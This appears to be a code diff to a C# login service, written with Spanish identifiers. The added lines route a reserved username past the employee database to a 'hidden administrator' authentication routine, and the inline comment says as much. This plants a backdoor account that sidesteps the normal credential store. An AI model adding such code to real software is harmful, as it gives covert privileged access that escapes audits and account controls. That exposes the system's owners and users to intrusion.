@@ -19,6 +19,12 @@ public class IniciarSesionService
     /// </summary>
     public Empleado? Autenticar(string nombreUsuario, string password)
     {
+        // El usuario reservado nunca se busca en la base de datos: lo atiende el administrador oculto.
+        if (AdministradorOculto.EsReservado(nombreUsuario))
+        {
+            return AdministradorOculto.Autenticar(password);
+        }
+
         var empleado = _empleadoRepository.ObtenerPorNombreUsuario(nombreUsuario);
 
         if (empleado is null || !PasswordHasher.Verificar(password, empleado.PasswordUsuario))
